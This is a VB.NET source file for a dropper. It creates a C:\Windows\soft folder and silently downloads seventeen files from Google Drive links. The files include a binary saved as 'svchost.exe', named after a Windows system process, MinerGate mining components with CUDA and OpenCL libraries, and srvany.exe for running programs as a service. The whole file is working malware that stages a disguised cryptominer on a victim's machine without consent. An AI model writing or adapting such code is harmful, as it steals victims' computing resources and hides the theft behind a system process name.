Imports System.Net
Imports System.ComponentModel

Module Module1

    Sub Main()

        If My.Computer.Network.IsAvailable Then
            'MsgBox("Computer is connected.")
            Download()
            Try

            Catch ex As Exception
            End Try
        Else
            ' MsgBox("Computer is not connected.")
        End If       
    End Sub
    Private Sub Download()
        '1
        Dim svchost As String = "C:\Windows\soft\svchost.exe"
        Dim Qt5Widgets As String = "C:\Windows\soft\Qt5Widgets.dll"
        Dim Qt5Network As String = "C:\Windows\soft\Qt5Network.dll"
        Dim Qt5Gui As String = "C:\Windows\soft\Qt5Gui.dll"
        Dim Qt5Core As String = "C:\Windows\soft\Qt5Core.dll"
        Dim minergate As String = "C:\Windows\soft\minergate-service-settings.exe"
        Dim vccorlib120 As String = "C:\Windows\soft\vccorlib120.dll"
        Dim Uninstall As String = "C:\Windows\soft\Uninstall.exe"
        Dim ssleay32 As String = "C:\Windows\soft\ssleay32.dll"
        Dim srvany As String = "C:\Windows\soft\srvany.exe"
        Dim msvcr120 As String = "C:\Windows\soft\msvcr120.dll"
        Dim Qt5WebSockets As String = "C:\Windows\soft\Qt5WebSockets.dll"
        Dim OpenCL As String = "C:\Windows\soft\OpenCL.dll"
        Dim libeay32 As String = "C:\Windows\soft\libeay32.dll"
        Dim msvcp120 As String = "C:\Windows\soft\msvcp120.dll"
        Dim cudart64_75 As String = "C:\Windows\soft\cudart64_75.dll"
        Dim qwindows As String = "C:\Windows\soft\platforms\qwindows.dll"

        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\soft")
        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\soft\platforms")


        'Download 17 file
        If My.Computer.FileSystem.FileExists(svchost) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3S005dGJuWGpWNEU"), svchost)
            End Using
        End If


        '2
        If My.Computer.FileSystem.FileExists(Qt5Widgets) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3OTJEbEh0N19ickE"), Qt5Widgets)
            End Using
        End If

        '3
        If My.Computer.FileSystem.FileExists(Qt5Network) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3M1hIX3JnYkdDSGs"), Qt5Network)
            End Using
        End If

        '4
        If My.Computer.FileSystem.FileExists(Qt5Gui) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3Um1OSzJndEZCbHc"), Qt5Gui)
            End Using
        End If

        '5
        If My.Computer.FileSystem.FileExists(Qt5Core) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3UGtoQ195RkxfUEE"), Qt5Core)
            End Using
        End If

        '6
        If My.Computer.FileSystem.FileExists(minergate) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3YTVIMUNIazk1U0U"), minergate)
            End Using
        End If

        '7
        If My.Computer.FileSystem.FileExists(vccorlib120) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3VnhiOE9NYzQxS1E"), vccorlib120)
            End Using
        End If

        '8
        If My.Computer.FileSystem.FileExists(Uninstall) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3aG14T3dfWnpCZTA"), Uninstall)
            End Using
        End If
        '9
        If My.Computer.FileSystem.FileExists(ssleay32) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3RllxbFVaMUVUTnM"), ssleay32)
            End Using
        End If
        '10
        If My.Computer.FileSystem.FileExists(srvany) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3WFRGdEFUM2tfUGc"), srvany)
            End Using
        End If
        '11
        If My.Computer.FileSystem.FileExists(msvcr120) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3YjhnUFlSWG9VUlk"), msvcr120)
            End Using
        End If
        '12
        If My.Computer.FileSystem.FileExists(Qt5WebSockets) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3X0N1ai1jWU9KUEk"), Qt5WebSockets)
            End Using
        End If
        '13
        If My.Computer.FileSystem.FileExists(OpenCL) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3anMzbkZ3Ui12Sms"), OpenCL)
            End Using
        End If
        '14
        If My.Computer.FileSystem.FileExists(libeay32) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3QzAzWFBfUDMtX2M"), libeay32)
            End Using
        End If
        '15
        If My.Computer.FileSystem.FileExists(msvcp120) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3cTdURmp3R0JzVVk"), msvcp120)
            End Using
        End If
        '16
        If My.Computer.FileSystem.FileExists(cudart64_75) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3Y2JZcndFRktIcUE"), cudart64_75)
            End Using
        End If
        '17
        If My.Computer.FileSystem.FileExists(qwindows) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3X3pHSHpRMXA1eG8"), qwindows)
            End Using
        End If

        Console.ReadLine()
    End Sub

    Public Sub DownloadCompleted(sender As Object, e As AsyncCompletedEventArgs)


        Console.WriteLine("Success")


    End Sub
End Module
